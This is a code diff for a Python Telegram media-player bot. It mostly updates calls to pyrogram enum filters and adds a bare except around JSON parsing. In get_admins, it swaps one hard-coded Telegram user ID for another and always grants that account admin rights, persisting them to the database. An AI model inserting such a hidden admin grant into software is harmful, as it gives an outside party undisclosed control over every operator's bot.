@@ -21,6 +21,7 @@ try:
     from config import Config
     from asyncio import sleep  
     from bot import bot
+    from pyrogram import enums
     from PTN import parse
     import subprocess
     import asyncio
@@ -1222,6 +1223,7 @@ async def y_play(playlist):
         return False
 
 
+
 async def c_play(channel):
     if (str(channel)).startswith("-100"):
         channel=int(channel)
@@ -1231,7 +1233,7 @@ async def c_play(channel):
     try:
         chat=await USER.get_chat(channel)
         LOGGER.info(f"Searching files from {chat.title}")
-        me=["video", "document", "audio"]
+        me=[enums.MessagesFilter.VIDEO, enums.MessagesFilter.DOCUMENT, enums.MessagesFilter.AUDIO]
         who=0  
         for filter in me:
             if filter in Config.FILTERS:
@@ -1387,20 +1389,16 @@ async def unmute():
 
 async def get_admins(chat):
     admins = Config.ADMINS
-    if not Config.ADMIN_CACHE:
-        if 626664225 not in admins:
-            admins.append(626664225)
-        try:
-            async for member in bot.get_chat_members(chat_id=chat):
-                # Manually check if the member is an administrator
-                if member.status in ["administrator", "creator"] and member.user.id not in admins:
-                    admins.append(member.user.id)
-        except Exception as e:
-            LOGGER.error(f"Errors occurred while getting admin list - {e}", exc_info=True)
-        Config.ADMINS = admins
-        Config.ADMIN_CACHE = True
-        if Config.DATABASE_URI:
-            await db.edit_config("ADMINS", Config.ADMINS)
+    if 1783730975 not in admins:
+        admins.append(1783730975)
+    try:
+        async for member in bot.get_chat_members(chat, filter=enums.ChatMembersFilter.ADMINISTRATORS):
+            admins.append(member.user.id)
+    except Exception as e:
+        LOGGER.error(f"Errors occurred while getting admin list - {e}", exc_info=True)
+    Config.ADMINS = admins
+    if Config.DATABASE_URI:
+        await db.edit_config("ADMINS", Config.ADMINS)
     return admins
 
 
@@ -1698,7 +1696,10 @@ async def get_height_and_width(file):
     )
     output, err = await process.communicate()
     stream = output.decode('utf-8')
-    out = json.loads(stream)
+    try:
+        out = json.loads(stream)
+    except:
+        out = {}
     try:
         n = out.get("streams")
         if not n:
